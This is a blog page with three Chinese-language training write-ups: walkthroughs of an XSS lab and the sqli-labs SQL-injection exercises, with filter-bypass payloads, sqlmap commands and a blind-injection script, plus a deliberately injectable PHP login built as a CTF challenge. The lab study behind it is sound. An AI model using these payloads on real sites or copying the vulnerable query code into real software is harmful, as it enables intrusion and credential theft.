<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-xsslab" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/07/21/xsslab/" class="article-date">
  <time datetime="2023-07-21T01:35:45.000Z" itemprop="datePublished">2023-07-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &quot;  &#x27;Oonn&gt; 可以用来测闭合</span><br></pre></td></tr></table></figure>
<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>将上面的test改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>检测搜索框内为双引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>“&gt;”被替换了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&#x27; onclick=&#x27;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>查看源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>双引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; onclick=&quot;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>关键词过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;scr_ipt &quot; &#x27;oo_nn=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
<p>点一下下面的蓝色连接即可</p>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>在上一题基础上有了更多过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a hr_ef=&quot;javascript:alert(1)&quot; &quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a hRef=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
<p>？上一题过滤大小写这题不过滤？</p>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>似乎删掉了关键字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt; &quot; &#x27;on=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>onclick删了on,过滤了但没完全过滤（</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; oonnclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>应该还是关键词过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt &quot;  &#x27;oo_nn&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>大小写绕过无效，自动转换为小写<br>可以编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br><span class="line">以上字符串对javascript:alert(1)进行ascii编码</span><br></pre></td></tr></table></figure>
<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script &amp;quot;  &#x27;oonn&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加友情链接&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>？不太对劲，百度下源码<br>要加个http://，剩下与第8题一样<br>只要有这个字段就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;(&#x27;http://&#x27;)</span><br><span class="line">刚开始还不知道拿这个http咋办，结果百度只要扔在后面就行</span><br></pre></td></tr></table></figure>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>随便扔个关键字进去没反应<br>F12</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>url里的keyword估计啥用没有，再扔几下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
<p>关键应该就是type把hidden改掉</p>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>把上一题payload扔进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>试了半天都差不多这样，麻<br>查了源码是referer请求头注入<br>题目好像有提示我傻了<br>把上一题的payload扔到referer里就行</p>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>又是请求头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>？服务器拒绝连接太6了<br>跳了不知道什么情况</p>
<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>这题改cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>emm还要添个user</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
<h3 id="level-14-（写不出来）"><a href="#level-14-（写不出来）" class="headerlink" title="level 14 （写不出来）"></a>level 14 （写不出来）</h3><p>需要用到这个网站：<a target="_blank" rel="noopener" href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> 需要梯子</p>
<p>查了下解法：<br>1.查看源码是iframe框，src到上面的网站<br>2.burp抓包请求，返回有字段X-Frame-Options:SAMEORIGIN（我抓了，没有，可能是我的问题），表示该页面要在相同域名的iframe中展示，修改为：X-Frame-Options:ALLOW-FROM http://…/xss/level14.php<br>3.这个网站可以从任意图像文件提取元数据，往文件写入xss payload<br>4.使用火狐firebug将scrolling=”no”改为yes会出现滚动条<br>5.win7修改图片属性可直接修改EXIF的值<br>6.payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>在上传过程不断修改返回包的X-Frame-Options字段</p>
<p>比前面的有趣，虽然我肯定不会写</p>
<h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>…<br>后面都404了，在冬令营那会还没问题<br>先这样了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/21/xsslab/" data-id="clkcq8h4y0000qoud4jq9gifl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-week1plus" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/07/16/week1plus/" class="article-date">
  <time datetime="2023-07-16T15:22:24.000Z" itemprop="datePublished">2023-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><del>目前应该还没法用</del><br><del>参考（照搬了不少其实）了大佬的代码终于正常运行了，代码的问题估计比代码还多</del><br>还是有不少语法错误，这次真能用了<br>结构：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sqltry/</span><br><span class="line">$ ├── docker-compose.yml</span><br><span class="line">$ ├── Dockerfile</span><br><span class="line">$ └── web</span><br><span class="line">$      ├── db.sql</span><br><span class="line">$      └── index.php  </span><br></pre></td></tr></table></figure>
<p>index.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        veryeasysql</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;style&gt;body&#123;height:100%&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;div class=&quot;index_01&quot;&gt;</span><br><span class="line">&lt;table style=&quot;width:100%;height:100;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;table width=350 height=230 class=&quot;index_table&quot;&gt;</span><br><span class="line">        &lt;form method =&quot;POST&quot; action=&quot;index.php&quot; name=&quot;check&quot;&gt;</span><br><span class="line">        &lt;tr style=&quot;font-size: 25px;&quot;&gt;</span><br><span class="line">            &lt;td colspan=&quot;2&quot; style=&quot;font-size: 35px;&quot;&gt;查询&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;账号&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;name&quot; name=&quot;uid&quot; placeholder=&quot;请输入账号&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;请输入密码&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;td colspan=&quot;2&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; class=&quot;btn&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;/from&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$id=$_POST[&#x27;uid&#x27;];</span><br><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;kali&quot;);</span><br><span class="line">if($conn-&gt;connect_error)&#123;</span><br><span class="line">        die(&quot;数据库连接失败&quot;.$conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;select * from users where username=&#x27;$id&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">print($sql);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line">if($id == &quot;&quot; || $password == &quot;&quot;)&#123;</span><br><span class="line">    echo &quot;账号密码不能为空&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">if($result)&#123;</span><br><span class="line">if($row)&#123;</span><br><span class="line">        echo &#x27;password:&#x27;.$row[1];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        // echo &quot;password:&quot;.$row[&#x27;password&#x27;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;账号不存在或密码错误&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else echo &quot;出错:&quot;.$conn-&gt;error;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>docker-compose.yml:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    image: sqli</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;400:80&quot;</span></span><br><span class="line">    deploy:</span><br><span class="line">      resources:</span><br><span class="line">        limits:</span><br><span class="line">          cpus: <span class="string">&#x27;0.50&#x27;</span></span><br><span class="line">          memory: 512M</span><br></pre></td></tr></table></figure>
<p>Dockerfile:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM ctfhub/base_web_nginx_mysql_php_74</span><br><span class="line"></span><br><span class="line">COPY web /var/www/html</span><br><span class="line"></span><br><span class="line">RUN sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e <span class="string">&quot;source /var/www/html/db.sql&quot;</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure>
<p>db.sql:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS kali;</span><br><span class="line">USE kali;</span><br><span class="line"></span><br><span class="line">SET SQL_MODE = &quot;NO_AUTO_VALUE_ON_ZERO&quot;;</span><br><span class="line">START TRANSACTION;</span><br><span class="line">SET time_zone = &quot;+00:00&quot;;</span><br><span class="line"></span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(10) NOT NULL,</span><br><span class="line">  `password` varchar(30) NOT NULL,</span><br><span class="line">    PRIMARY KEY (`username`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;admin&#x27;, &#x27;flag&#123;123abc#&#125;&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;xin&#x27;, &#x27;DALLAS&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;SALES&#x27;, &#x27;CHICAGO&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;OPERATIONS&#x27;, &#x27;BOSTON&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
<p>难度也变得非常智障</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/16/week1plus/" data-id="clk6k5tlo000a2gud4ae7e2ne" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-weekpro" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/07/16/weekpro/" class="article-date">
  <time datetime="2023-07-16T06:20:17.000Z" itemprop="datePublished">2023-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/07/16/weekpro/">2023/07/16：夏令营week1记录:sql-lab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>判断封闭过滤-&gt;搜集信息（数据库名、表名、字段名等）-&gt;注入<br>部署在localhost:8081</p>
<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h3><p>依标题这是get型，没有过滤（用#会直接报错）<br>尝试下?id=1’，报错，再用?id=1’–+，字符型<br>输入?id=1’ order by 3–+正常显示，改为4报错，判断有3列<br>获得数据库信息：?id=-1’ union select 1,database(),version()–+  结果为security<br>表：?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+   结果为users<br>字段：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+   由题目，选择username和password<br>结果：?id=-1’ union select 1,2,group_concat(username,id,password) from users –+</p>
<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h3><p>跟上一题差不多，不过数字型去掉单引号即可</p>
<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h3><p>输入?id=1’时报错信息中有括号，在单引号后补个括号后剩下步骤与Less 1差不多</p>
<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h3><p>输入?id=1’正常，输入?id=1”报错且报错信息中有括号，与Less 1类似</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h3><p>输入测试发现返回”You’re in”，没有回显，拿出sqlmap<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-5/?id=1&quot;">http://localhost:8081/Less-5/?id=1&quot;</a> –current-db<br>无脑全部yes<br>返回：security<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-5/?id=1&quot;">http://localhost:8081/Less-5/?id=1&quot;</a> -D ‘security’ –tables<br>返回：<br>+———-+<br>| emails   |<br>| referers |<br>| uagents  |<br>| users    |<br>+———-+<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-5/?id=1&quot;">http://localhost:8081/Less-5/?id=1&quot;</a> -D ‘security’ -T ‘users’ –columns<br>返回：<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(3)      |<br>| password | varchar(20) |<br>| username | varchar(20) |<br>+———-+————-+<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-5/?id=1&quot;">http://localhost:8081/Less-5/?id=1&quot;</a> -D ‘security’ -T ‘users’ -C ‘password,username’ –dump<br>返回：<br>+————+———-+<br>| password   | username |<br>+————+———-+<br>| admin      | admin    |<br>| admin1     | admin1   |<br>| admin2     | admin2   |<br>| admin3     | admin3   |<br>| admin4     | admin4   |<br>| crappy     | secure   |<br>| Dumb       | Dumb     |<br>| dumbo      | dhakkan  |<br>| genious    | superman |<br>| I-kill-you | Angelina |<br>| mob!le     | batman   |<br>| p@ssword   | Dummy    |<br>| stupidity  | stupid   |<br>+————+———-+<br>结束</p>
<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h3><p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-6/?id=1&quot;">http://localhost:8081/Less-6/?id=1&quot;</a> –current-db<br>返回：security<br>剩下跟Less 5差不多了</p>
<h3 id="Less-7-amp-8"><a href="#Less-7-amp-8" class="headerlink" title="Less 7 &amp; 8"></a>Less 7 &amp; 8</h3><p>同上，强大的sqlmap解决了一切<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-7/?id=1&quot;">http://localhost:8081/Less-7/?id=1&quot;</a> –current-db<br>返回：security<br>剩下也差不多了</p>
<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h4><p>一个网上抄的脚本：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13927568/5830763">https://blog.51cto.com/u_13927568/5830763</a><br>尝试手写脚本，一直sqlmap太那啥了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">success_url = &quot;http://localhost:8081/Less-8/?id=1&quot;</span><br><span class="line">success_response_len = len(requests.get(success_url).text)</span><br><span class="line"></span><br><span class="line">def get_DBName_len():</span><br><span class="line">    DBName_len = 0</span><br><span class="line">    url_template = success_url + &quot;&#x27; and (length(database())=&#123;0&#125;) %2D%2D%20&quot;</span><br><span class="line">    for i in range(1,20):</span><br><span class="line">        url = url_template.format(i)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        if len(response.text) == success_response_len:</span><br><span class="line">            DBName_len = i</span><br><span class="line">            print(&quot;DBName_len is:&quot;,DBName_len)</span><br><span class="line">            break</span><br><span class="line">    return DBName_len</span><br><span class="line"></span><br><span class="line">get_DBName_len()</span><br></pre></td></tr></table></figure>
<h3 id="Less-9-amp-10"><a href="#Less-9-amp-10" class="headerlink" title="Less 9 &amp; 10"></a>Less 9 &amp; 10</h3><p>时间盲注sqlmap也解决一切<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-9/?id=1&quot;">http://localhost:8081/Less-9/?id=1&quot;</a> –current-db<br>返回：security</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/16/weekpro/" data-id="clk6k5tlo000b2gudb3yv75if" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
